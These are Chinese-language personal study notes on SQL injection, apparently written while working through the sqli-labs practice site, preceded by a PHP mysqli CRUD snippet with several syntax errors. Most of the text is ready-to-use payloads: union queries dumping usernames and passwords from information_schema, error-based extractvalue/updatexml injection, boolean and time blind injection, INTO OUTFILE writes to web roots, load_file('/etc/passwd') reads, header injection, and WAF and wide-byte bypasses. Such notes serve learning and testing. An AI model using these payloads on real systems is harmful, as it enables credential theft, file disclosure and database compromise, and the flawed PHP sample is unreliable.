#### 1、sql标准流程
```php
<?php
$servername = "localhost";
$username = "root";
$password = "root"
$dbname = "hh"	// 库名

$con = new mysqli($servername, $username, $password, $dbname);

if($con->connect_error){
    die("...");
}

//查
$sql = "SELECT * FROM table1 WHERE id = 2";

// 执行sql语句并返回到result变量中
$result = $con->query($sql);

if($result->num_rows > 0){
    // 穷举
    while($row = $result->fetch_assoc()){
        echo $row['username'].'.............'.$row['password'].<br/>
    }
}

// 增
$sql = "INSERT INTO tables (id, username, password) VALUES
	(21, 'test1', 'tttt')"

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

//改
$sql = "UPDATE table1 SET password = '1111'
	WHERE username = 'xiaohong'";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 删
$sql = "DELETE FROM table1 WHERE id = 21";

if($con -> query($sql) === TURE){
    echo '执行成功!!!';
}
else{
    echo '执行失败...'.$con->error;
}

// 断开数据库
$con->close();
?>
```

#### 2、SQL注入

###### sql小知识：mysql -u[用户名] -p[密码]
###### 查看所有的数据库：show databases;
###### 使用某个数据库名：use [数据库名];
###### 查看此库里有什么表：show tables;
##### 步骤1：推断数据库的语法
```
SELECT * FROM ... where id = '参数' limit 0, 1;
SELECT * FROM ... where id = "参数" limit 0, 1;
```
##### 步骤2：让他报错，显示自己的闭合方式
```
闭合方式的可能
' " ') ") )
```
##### 步骤3：验证目标数据库的参数闭合方式
```
?id = 1' limit 0, 1 --+  // --+的作用为将后面的直接注释掉
```
##### 步骤4：确定有多少列
```
?id = 1' order by 10 limit 0, 1 --+ // 二分法求的多少列
```
##### 步骤5：有哪几列显示在网页上（联合查询，前面的参数必须让数据库报错，显示报错位）
```
?id = -1' union select 1, 2, 3 limit 0, 1 --+
```
##### 步骤6：刺探数据库的内部内容
```
?id = -2' union select 1, database(), 3 limit 0, 1 --+
```
###### 注：information_schema是数据库自带的，相当于数据库的户口本
###### information_schema的tables里面保存着所有数据库的库名和自己的表
###### information_schema的columns保存着所有数据库的库名、列名、表名的所有对应关系
```
?id=-2' union select 1, table_name ,3 from information_schema.tables where table_schema = 'security' limit 0, 1--+

?id=-2' union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema = 'security' --+
```
##### 步骤7：查询表中的列
```
?id=-2' union select 1, group_concat(column_name) ,3 from information_schema.columns where table_schema = 'security' and table_name = 'users'--+
``` 
##### 步骤8：查询内容
```
-2' union select 1, group_concat(username), group_concat(password) from users --+
```
#### 3、报错注入
###### 小知识：
```php
SELECT count(*) FROM table1 // 计算table1中有多少个结果
SELECT floor(rand() * 2) // 取一个随机的0-1整数
    
// 0x3a 十六进制的:
select concat(0xa3, 0x3a, (select database()), 0x3a, 0x3a) a;	// 输出 ::库名::，并取别名a

//报错写法
select count(*), concat(0x3a, 0x3a, select(database()), 0x3a, 0x3a, floor(rand() * 2))a from table1 group by a
```
##### 写法：
```php
?id=1' AND (select 1 from (
	select count(*), 
	concat(0x3a, 0x3a, (select database()),0x3a, 0x3a, floor(rand() * 2))a 
from information_schema.tables group by a) b) --+

?id=1' AND (select 1 from (
	select count(*), 
	concat(0x3a, 0x3a, (select table_name from information_schema.tables where table_schema = 'security' limit 0, 1),0x3a, 0x3a, floor(rand() * 2))a 
from information_schema.tables group by a) b) --+
    
    
// 简单方法
?id = 1' AND extractvalue(1, concat(0x7e, (select database()), 0x7e)) --+
?id = 1' AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) --+
```
#### 4、bool型盲注 less8
```
不显示错误，也不显示任何数据库内容
记录下报错显示
?id = 1 正常
?id = 1\ 不正常
?id = haha 不正常
?id = 1' --+ 正常
?id = 1 AND 0 不正常
?id = 1 AND 1 正常
?id = 1 AND 1 < 2 正常
?id = 1 AND 1 > 2 不正常

?id = 1 AND (select assic(substr(database(), 1, 1)) = 115) 截取表名第一个字符对应的assic值和104是否相等，判断database的内容

?id = 1 AND (select assic(substr((select table_name from information_schema where table_schema = database() limit 0, 1), 1, 1)) = 115)
```
#### 5、bool型时间盲注
```php
id = 2' AND sleep(10) // 如果正确，则睡十秒后反应

id = 2' AND if((select substr(database(), 1, 1)) = 'e', sleep(5), null)  // 如果正确，则睡5秒，否则不返回
```
#### 6、intooutfile注入
```sql
# 把取出的数据保存在某个文件中
select * from table1 into outfile "D:/phpstudy_pro/WWW/a.txt";		# windows
select * from table1 into outfile "/var/www/html/a.txt";			# linux

select * from table1 limit 0, 1 into dumpfile "c:/a.txt"

# 加载某个文件并显示
select load_file("/etc/passwd");

# 加载文件并转存
select load_file("/etc/passwd") into outfile "D:/phpstudy_pro/WWW/a.txt"
```

```php
?id=-2')) union select 1, database(), 3 into outfile "D:/phpstudy_pro/WWW/sqli-labs-master/Less-7/a.txt"
```
#### 7、post注入
```
猜测源码
$u = $_POST['uname'];
$p = $_POST['passwd'];
猜测:
select username, password from table1 where username = ("$u") and password = ("$p")

注释：get用--+ 	post用#
```
##### 第一种：
```
select username, password from table1 where username = (" ") and password = (" ")	# 错误

select username, password from table1 where username = (" ") or 1 = 1 limit 0, 1 # ") and password = (" ")	# 错误

") or 1 = 1 limit 0, 1 #

")  order by 2 #

") union select 1, 2 limit 0, 1 #		显示报错位之后便是格式化操作
```
##### 第二种
```
使用burpsuit
抓到post的数据包，右键--send to repeater，然后放行该数据包，之后到repeater中测试
```
#### 8、post报错以及盲注
```
#Less14
" and extractvalue(1, concat(0x7e, (select database()), 0x7e)) #

或者
" and extractvalue(1, concat(0x7e, (select database()), 0x7e))  and "1" = "1	# 其实"1"="1的目的在于闭合后面的"
```
#### 9、重置密码(不重要)
```sql
# 猜测代码框架(不要多做)
update users set password = '$p' where username = '$u';
```
```
admin
' or 1 = 1#
```
#### 10、http头注入
```
不要使用注释符

当目标网站获得了我们的user-agent之后，存到了数据库

猜测:
insert into '某个库'.'某个表' ('浏览器信息', 'ip地址', '用户名')
		values ('', '127.0.0.1', 'admin');

user-agent:
'and extractvalue(1, concat(0x7e, (select database()) ,0x7e)) and '1' = '1
```
#### 11、waf注释符过滤
```
屏蔽 --+ #
?id=1'
'在进行url编码后会变成%27

get请求最后送到服务器上都会进行url编码

?id = -2' union select 1, database(), 3 or '1' = '1
必要的时候在写完之后对参数进行url编码
```
#### 12、越权漏洞
```
$new_pass1 = $_POST['new_pass1'];
$new_pass2 = $_POST['new_pass2'];
if($new_pass1 = $new_pass2){
	update users set password = '123' where username = 'admin' # ' and password = '$old_pass'
}

修改admin'#这个用户的密码时候，其实就是修改admin的密码
```
#### 13、waf屏蔽空格
```
屏蔽 or and 空格 --+

代替空格的东西：
%09	水平tab键
%0a	新建一行
%0c	新建一页
%0d	回车键
%0b	垂直tab
%a0	也可以是空格键（大部分情况使用）

报错问题，屏蔽-
用0 或者 20000000
```
#### 14、union、select、注释符被屏蔽
```
id=2' or '1'='1'
发现空格没了
可以大小写翻转
id=0'%0buNion%0bsELect%0b1,database(),3%0b||%0b'1
```
#### 15、宽字节注入
```
小知识：
'前面自动会加上\
mysql用gbk编码把两个字符当做一个汉字(编码方式改为unicode就不会出现此漏洞)

\ = %5c
' = %27

%df会吃掉%5c
%df%5c会被当成一个汉字

?id=-1%df' union select 1, database(), 3 --+
!!!提醒，在用表名列名的时候可以用hex直接编码(不需要引号)

!!!!在post情况下的宽字节注入，得直接在burp的post数据包下进行修改，因为在前端不会将%df和\当做中文
```
